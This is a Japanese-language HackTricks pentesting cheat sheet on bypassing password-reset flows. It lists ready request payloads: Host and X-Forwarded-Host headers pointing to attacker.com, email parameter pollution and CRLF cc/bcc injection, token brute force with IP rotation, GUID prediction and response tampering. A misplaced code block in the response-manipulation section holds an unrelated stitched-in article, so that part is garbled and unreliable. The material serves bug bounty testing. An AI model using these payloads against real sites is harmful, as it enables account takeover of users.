# パスワードリセット/忘れたパスワードのバイパス

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取るために[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)サーバーに参加しましょう！

**ハッキングの洞察**\
ハッキングのスリルと挑戦に焦点を当てたコンテンツに参加する

**リアルタイムハックニュース**\
リアルタイムのニュースと洞察を通じて、速いペースのハッキングの世界に追いつく

**最新の発表**\
最新のバグバウンティの開始と重要なプラットフォームの更新情報に通じている

**今日から** [**Discord**](https://discord.com/invite/N3FrSbmwdy) に参加して、トップハッカーとのコラボレーションを始めましょう！

以下のテクニックの再編集は [https://anugrahsr.github.io/posts/10-Password-reset-flaws/](https://anugrahsr.github.io/posts/10-Password-reset-flaws/) から取られました。

## リファラー経由でのパスワードリセットトークンリーク

**HTTPリファラー**は、リクエストされているリソースにリンクされているウェブページのアドレスを識別するオプションのHTTPヘッダーフィールドです。Refererリクエストヘッダーには、現在リクエストされているページへのリンクが続いた前のウェブページのアドレスが含まれています。

![](https://www.optimizesmart.com/wp-content/uploads/2020/01/1-1-2.jpg)

### 悪用方法

* パスワードリセットを自分のメールアドレスにリクエストする
* パスワードリセットリンクをクリックする
* パスワードを変更しない
* 第三者のウェブサイト（例：Facebook、Twitter）をクリックする
* Burpsuiteプロキシでリクエストをインターセプトする
* Refererヘッダーがパスワードリセットトークンをリークしていないか確認する。

### 影響

特定のサイトを制御している人がユーザーのパスワードを変更することを可能にします（CSRF攻撃）、なぜならこの人はユーザーのパスワードリセットトークンを知っているからです。

### 参考文献:

* https://hackerone.com/reports/342693
* https://hackerone.com/reports/272379
* https://hackerone.com/reports/737042
* https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a
* https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1

## パスワードリセットポイズニング

ホストヘッダー攻撃を見つけて、それがスコープ外である場合は、パスワードリセットボタンを探してみてください！

![](https://portswigger.net/web-security/images/password-reset-poisoning.svg)

### 悪用方法

* Burpsuiteでパスワードリセットリクエストをインターセプトする
* 次のヘッダーを追加するか、burpsuiteでヘッダーを編集する（一つずつ試す）
```
Host: attacker.com
```

```
Host: target.com
X-Forwarded-Host: attacker.com
```

```
Host: target.com
Host: attacker.com
```
* メール内のパスワード変更リンクがattacker.comを指しているか確認する

### パッチ

`$_SERVER['HTTP_HOST']` の代わりに `$_SERVER['SERVER_NAME']` を使用する
```php
$resetPasswordURL = "https://{$_SERVER['HTTP_HOST']}/reset-password.php?token=12345678-1234-1234-1234-12345678901";
```
### 影響

被害者はメールで悪意のあるリンクを受け取り、クリックすると、ユーザーのパスワードリセットリンク/トークンが攻撃者に漏洩し、完全なアカウント乗っ取りにつながります。

### 参考文献:

* https://hackerone.com/reports/226659
* https://hackerone.com/reports/167631
* https://www.acunetix.com/blog/articles/password-reset-poisoning/
* https://pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/
* https://medium.com/@swapmaurya20/password-reset-poisoning-leading-to-account-takeover-f178f5f1de87

## メールパラメータを操作してパスワードリセット

### 悪用

* & を使用して攻撃者のメールを二番目のパラメータとして追加
```php
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```
* 攻撃者のメールを第二パラメータとして%20を使用して追加
```php
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```
* 攻撃者のメールを二番目のパラメータとして | を使用して追加
```php
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```
* 攻撃者のメールをccを使用して第二パラメータとして追加
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```
* 攻撃者のメールをbccを使用して第二パラメータとして追加
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```
* 攻撃者のメールを第二パラメータとして、を使用して追加
```php
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```
* json 配列の第二パラメーターとして攻撃者のメールを追加
```php
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```
### 参考文献

* https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be
* https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/
* https://twitter.com/HusseiN98D/status/1254888748216655872

## APIパラメータを通じて任意のユーザーのメールアドレスとパスワードを変更する

### 悪用方法

* 攻撃者は自分のアカウントでログインし、パスワード変更機能に移動する
* Burp Suiteを起動し、リクエストをインターセプトする
* リクエストをインターセプトした後、リピーターに送信し、EmailとPasswordのパラメータを変更する
```php
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```
### 参考文献

* https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240

### レート制限なし：メール爆撃 <a href="#5-no-rate-limiting-email-bombing" id="5-no-rate-limiting-email-bombing"></a>

### 悪用方法

* Burp Suiteを起動し、パスワードリセットリクエストをインターセプトする
* イントルーダーに送信する
* nullペイロードを使用する

### 参考文献

* https://hackerone.com/reports/280534
* https://hackerone.com/reports/794395

## パスワードリセットトークンの生成方法を調べる

パスワードリセットトークンのパターンを解明する

![](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSvCcLcUTksGbpygrJB4III5BTBYEzYQfKJyg\&usqp=CAU)

もしトークンが

* タイムスタンプに基づいて生成される場合
* UserIDに基づいて生成される場合
* ユーザーのメールアドレスに基づいて生成される場合
* 名前と姓に基づいて生成される場合
* 生年月日に基づいて生成される場合
* 暗号学に基づいて生成される場合

トークンのランダム性や予測可能性を見つけるためにBurp Sequencerを使用する。

## 推測可能なGUID

GUIDにはいくつかのタイプがある：

* **バージョン0：** nil GUID（"00000000-0000-0000-0000-000000000000"）でのみ見られる。
* **バージョン1：** GUIDは予測可能な方法で生成される：
  * 現在の時間
  * システムのアップタイム中にGUID間で一定のままの「クロックシーケンス」
  * 利用可能であればシステムのMACアドレスに基づいて生成される「ノードID」
* **バージョン3：** GUIDは提供された名前と名前空間のMD5ハッシュを使用して生成される。
* **バージョン4：** GUIDはランダムに生成される。
* **バージョン5：** GUIDは提供された名前と名前空間のSHA1ハッシュを使用して生成される。

GUIDを見てそのバージョンを見つけることが可能であり、そのための小さなツールがある：[**guidtool**](https://github.com/intruder-io/guidtool)****
```http
guidtool -i 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c
UUID version: 1
UUID time: 2021-11-17 17:52:18.141000
UUID timestamp: 138564643381410000
UUID node: 17547390002044
UUID MAC address: 0f:f5:91:f2:a3:7c
UUID clock sequence: 3426
```
使用されているバージョンがバージョン1でパスワードリセットGUIDを生成する場合、GUIDをブルートフォースすることが可能です。
```http
guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000
a34aca00-47d0-11ec-8d62-0ff591f2a37c
a34af110-47d0-11ec-8d62-0ff591f2a37c
```
### 参考文献

* [https://www.intruder.io/research/in-guid-we-trust](https://www.intruder.io/research/in-guid-we-trust)

## レスポンス操作：不正なレスポンスを正しいものに置き換える

このようなリクエストとレスポンスを探す
```php
HTTP/1.1 401 Unauthorized
(“message”:”unsuccessful”,”statusCode:403,”errorDescription”:”Unsuccessful”)
```
```
# パスワードのリセット応答を変更する

パスワードリセット機能は、攻撃者にとって魅力的なターゲットです。この機能を悪用することで、攻撃者はユーザーのアカウントを乗っ取ることができます。以下は、パスワードリセットプロセス中に応答を変更する一般的な手法です。

## 応答を変更してアカウントを乗っ取る

1. 攻撃者はパスワードリセットリクエストを送信します。
2. サーバーはリセットトークンを含む応答を返します。
3. 攻撃者は応答を傍受し、リセットトークンを取得します。
4. 攻撃者はこのトークンを使用してパスワードをリセットし、アカウントを乗っ取ります。

この攻撃を成功させるためには、攻撃者は通常、ネットワークトラフィックを傍受する能力が必要です。これは、公共のWi-Fiなどのセキュリティが低いネットワークを利用する場合に特に容易になります。

## 対策

- HTTPSを使用してデータを暗号化し、傍受を防ぎます。
- リセットトークンの有効期限を短く設定します。
- 二要素認証を実装してセキュリティを強化します。

これらの対策は、攻撃者がパスワードリセットプロセスを悪用するのを防ぐのに役立ちます。
```
```php
HTTP/1.1 200 OK
(“message”:”success”,”statusCode:200,”errorDescription”:”Success”)
```
### 参考文献

* https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3

### 期限切れトークンの使用 <a href="#8-using-expired-token" id="8-using-expired-token"></a>

* 期限切れトークンが再利用可能かどうかを確認する

### パスワードリセットトークンのブルートフォース <a href="#9-brute-force-password-rest-token" id="9-brute-force-password-rest-token"></a>

Burpsuiteを使用してリセットトークンをブルートフォースで試みる
```php
POST /resetPassword
[...]
email=victim@email.com&code=$BRUTE$
```
* IPベースのレートリミットを回避するためにburpsuiteでIP-Rotatorを使用する。

### 参考文献

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

### トークンの使用を試す <a href="#10-try-using-your-token" id="10-try-using-your-token"></a>

* 被害者のアカウントにあなたのパスワードリセットトークンを追加してみる
```php
POST /resetPassword
[...]
email=victim@email.com&code=$YOUR_TOKEN$
```
### 参考

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

## ログアウト/パスワードリセット時のセッション**無効化**

ユーザーが**ログアウトまたはパスワードをリセットする**場合、現在のセッションは無効化されるべきです。\
そのため、ユーザーがログインしている間に**クッキーを掴み**、**ログアウトし**、**クッキー**がまだ**有効**かどうかを**確認**します。\
ログアウトの代わりにパスワードを**変更する**プロセスを繰り返します。

## リセットトークンの有効期限

**リセットトークンには有効期限を設ける**必要があり、期限後にはトークンはユーザーのパスワードを変更するためには無効であるべきです。

## 追加チェック

* username@burp\_collab.net を使用し、コールバックを分析する
* ユーザーのカーボンコピー email=victim@mail.com%0a%0dcc:hacker@mail.com
* 長いパスワード (>200) はDoSを引き起こす
* 2番目のメールパラメータと値を追加する

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取るために [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) サーバーに参加しましょう！

**ハッキングの洞察**\
ハッキングのスリルと挑戦に焦点を当てたコンテンツに参加する

**リアルタイムハックニュース**\
リアルタイムのニュースと洞察を通じて、速いペースで変化するハッキングの世界を最新の状態に保つ

**最新のアナウンス**\
最新のバグバウンティの開始と重要なプラットフォームの更新情報を入手する

**今すぐ** [**Discord**](https://discord.com/invite/N3FrSbmwdy) に参加して、トップハッカーとのコラボレーションを始めましょう！

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) でゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>こちら</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有**してください。

</details>
